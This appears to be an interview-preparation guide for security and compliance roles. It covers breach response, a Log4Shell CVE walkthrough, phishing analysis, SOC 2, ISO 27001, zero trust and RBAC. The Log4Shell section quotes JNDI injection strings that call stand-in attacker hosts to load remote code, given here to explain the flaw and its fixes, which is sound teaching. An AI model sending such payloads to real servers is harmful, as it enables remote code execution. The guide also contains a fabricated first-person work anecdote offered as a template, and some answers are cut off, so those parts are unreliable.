Our DB was stolen/exfiltrated. It was secured with one round of sha256 with a static salt.
What do we do now? Are we at risk? What do we change?
Immediate actions:
Notify affected users: Mandatory password reset
Disclosure: Comply with data breach notification laws
Monitoring: Watch for credential stuffing attacks
Investigation: How was DB accessed? Close that vector
Risk assessment:
High risk: SHA256 with static salt is weak
Single round is fast to crack with GPUs
Static salt means rainbow tables partially useful
All passwords compromised should be assumed
Changes required:
Password hashing: Switch to bcrypt, scrypt, or Argon2
Unique salts: Per-user random salts
Key stretching: High iteration counts (slows brute force)
Pepper: Application-level secret in addition to salt
Review: All security controls, access logs
Implement: MFA, anomaly detection
Incident response: Formalize IR plan
Long-term: Regular security audits, penetration testing, security awareness training.

Given a CVE, walk us through it and how the solution works.
Example: CVE-2021-44228 (Log4Shell)
Vulnerability:
Apache Log4j 2 JNDI injection
Attacker-controlled string logged by application
String contains JNDI lookup: ${jndi:ldap://evil.com/exploit}
Log4j performs JNDI lookup, loads remote class
Remote code execution achieved
Attack flow:
Attacker sends: ${jndi:ldap://attacker.com/Exploit}
Log4j processes string, sees JNDI lookup
Connects to attacker’s LDAP server
Downloads and executes malicious Java class
Solution:
Update: Upgrade to Log4j 2.17.1+ (JNDI disabled by default)
Mitigation: Set log4j2.formatMsgNoLookups=true
Disable: JNDI lookup feature if update not immediately possible
WAF rules: Block JNDI patterns in requests
Network: Block outbound LDAP connections
Detection: Scan for vulnerable versions, check logs for JNDI patterns.
Tell me about a repetitive task at work that you automated away.
(This should be specific to your experience. I’ll provide a template based on your fintech
background)
“At PayPal, I automated the technical onboarding documentation process for new
enterprise merchants. Previously, integration guides were manually customized for each
client, taking 4-6 hours per merchant. I created a Python script that generated tailored API
documentation based on the merchant’s product selection, payment methods, and
compliance requirements. The script pulled data from our internal systems, populated
templates, and generated PDF documentation. This reduced documentation time to 15
minutes and eliminated errors from manual copying. The tool became part of our standard
onboarding workflow and was later adopted by other regional teams.”
How would you analyze a suspicious email link?

Network traffic: Monitor connections in sandbox
Email headers: Check SPF, DKIM, DMARC, originating IP
Tools: URLScan.io, VirusTotal, ANY.RUN, Hybrid Analysis, PhishTool
Compliance
Can you explain SOC 2?
SOC 2 (Service Organization Control 2):
Audit framework by AICPA
Evaluates service providers’ controls around data security
Voluntary compliance (not regulatory)
Important for SaaS companies, cloud providers
Two types:
Type I: Controls designed properly at specific point in time
Type II: Controls operating effectively over period (6-12 months)
Process: Audit by CPA firm, results in confidential report for customers.
What are the five trust criteria?
SOC 2 Trust Service Criteria:
Security: Protection against unauthorized access
Availability: System available for operation and use as committed
Processing Integrity: System processing is complete, accurate, timely, authorized
Confidentiality: Information designated as confidential is protected
Privacy: Personal information collected, used, retained, disclosed, disposed per
commitments
All SOC 2 audits include Security; others are optional based on services provided.
How is ISO27001 different?
ISO 27001 vs. SOC 2:
ISO 27001:
International standard
Information Security Management System (ISMS)
Certification (public certificate)
114 controls in Annex A
More prescriptive
Global recognition
Self-declaration or third-party certification
SOC 2:
US-based
Trust Service Criteria
Report (confidential to customers)
Flexible controls
More flexible, risk-based
US market focused
Always third-party audit
Common ground: Both demonstrate security commitment, require regular audits, involve
policies and controls.
Can you list examples of controls these frameworks require?
Common security controls:
Access control: MFA, least privilege, role-based access
Encryption: Data at rest and in transit
Logging and monitoring: Audit trails, SIEM
Incident response: Plan, testing, documentation
Backup and recovery: Regular backups, tested restores
Vulnerability management: Scanning, patching
Change management: Approval process, documentation
Security awareness training: Annual training for all staff
Vendor management: Due diligence, contracts
Risk assessment: Annual assessments, treatment plans
Physical security: Datacenter access controls
Business continuity: DR plan, annual testing
What is the difference between Governance, Risk and Compliance?
GRC framework:

Verify explicitly: Always authenticate and authorize
Least privilege: Minimal access required for task
Assume breach: Minimize blast radius, segment access
Implementation:
Identity-based access
Micro-segmentation
Multi-factor authentication
Continuous monitoring
Device health verification
Encrypt everything
Contrasts with perimeter-based security (castle-and-moat model).
What is role-based access control (RBAC) and why is it covered by compliance
frameworks?
RBAC:
Access control model based on roles
Users assigned to roles, roles granted permissions
Simplifies permission management
Supports least privilege principle
Example:
Role: “Database Administrator”
Permissions: Read, write, backup databases
Users: John, Sarah assigned to role
Why in compliance:
Least privilege: Core security principle
Auditability: Clear who has what access
Segregation of duties: Prevents fraud
Accountability: Track actions to roles
Scalability: Easier to manage large orgs
Required by PCI-DSS, HIPAA, SOX, SOC 2, ISO 27001.
What is the NIST framework and why is it influential?
